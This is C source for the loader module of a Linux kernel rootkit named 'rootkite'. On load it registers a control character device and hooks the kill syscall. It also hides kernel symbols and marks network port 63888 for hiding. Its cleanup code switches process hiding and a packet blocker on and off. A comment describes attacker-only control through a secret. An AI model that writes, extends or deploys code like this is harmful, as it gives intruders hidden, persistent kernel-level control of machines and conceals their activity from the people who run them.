#include <linux/init.h> // macros to mark up functions
#include <linux/module.h> // core header for loading lkms into the kernel
#include <linux/kernel.h> // types, macros, functions for kernel
#include <linux/kallsyms.h> // functions for kallsyms actions
#include <linux/unistd.h> // syscalls macros (checks for 32 bit and defines accordinly)
#include <linux/reboot.h> // reboot function

#include "kite_init.h"
#include "kite_hook.h"
#include "kill_kite.h"
#include "device_handler.h"


MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("rootkite");
MODULE_AUTHOR("NondairyDig");
MODULE_VERSION("1.0");

/*
!!! change to debugger
NEW PLAN: make the rootkit communicate through the chardev. 
The hiding of the chardev will be through the kill funciton that will be hooked at the start.
the actions will be depoendent on a "secret" that is known only to the attacker that uses the kit.
*/


static void cleanup(void){
    fh_remove_hooks(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE); //cleanup the hooks and revert them
    cleanup_lists();
    misc_deregister(&controller); // deregister the device controller
    if(hide_process_active == 1){
        switch_hide_process();
    }
    if(packet_blocker == 1){
        switch_net_hook();
    }
}


static int __init mod_init(void){
    pr_debug("Activated rootkite, Initializing & Hooking Kill\n");
    #ifdef PTREGS_SYSCALL_STUB
        pr_info("Running in 64bit mode");
    #endif
    misc_register(&controller); // register the device for interaction within filesystem
    if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "__x64_sys_kill") == 1){ //hook the kill function for interaction with the lkm
        pr_err("error hooking syscall %d\n", __NR_kill);
    }
    hide_ksyms();
    insert_node(&ports_to_hide, "63888");
    return 0;
}


static void __exit mod_exit(void){
    cleanup();
    pr_debug("rootkite: exit\n");
}


module_init(mod_init);
module_exit(mod_exit);